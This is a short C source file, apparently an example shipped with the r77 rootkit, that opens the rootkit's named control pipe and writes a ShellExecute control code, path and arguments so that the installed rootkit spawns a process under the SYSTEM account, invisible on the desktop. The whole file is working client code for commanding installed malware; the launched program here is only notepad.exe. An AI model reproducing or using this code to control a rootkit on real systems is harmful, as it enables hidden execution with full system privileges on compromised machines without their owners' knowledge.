#include <Windows.h>

// This example demonstrates how to make r77 perform a ShellExecute.
// All other control codes work similarly.

#define CONTROL_USER_SHELLEXEC 0x3001 // These constants can be found in r77def.h or in the technical documentation

int main()
{
	// Connect to the r77 service. The rootkit must be installed.
	HANDLE pipe = CreateFileW(L"\\\\.\\pipe\\$77control", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (pipe != INVALID_HANDLE_VALUE)
	{
		DWORD controlCode = CONTROL_USER_SHELLEXEC;
		WCHAR shellExecPath[] = L"C:\\Windows\\System32\\notepad.exe";
		WCHAR shellExecCommandline[] = L"mytextfile.txt";

		// Write control code (DWORD)
		DWORD bytesWritten;
		WriteFile(pipe, &controlCode, sizeof(DWORD), &bytesWritten, NULL);

		// Write the path for ShellExec (unicode string including null terminator)
		WriteFile(pipe, shellExecPath, (lstrlenW(shellExecPath) + 1) * 2, &bytesWritten, NULL);

		// Write arguments for ShellExec
		WriteFile(pipe, shellExecCommandline, (lstrlenW(shellExecCommandline) + 1) * 2, &bytesWritten, NULL);

		// Now, a new process "notepad.exe mytextfile.txt" will spawn.
		// You will only see it in TaskMgr. Because this process is running under the SYSTEM user, it does not show up on the desktop.

		// Use the Test Console to try out different control codes.

		CloseHandle(pipe);
	}

	return 0;
}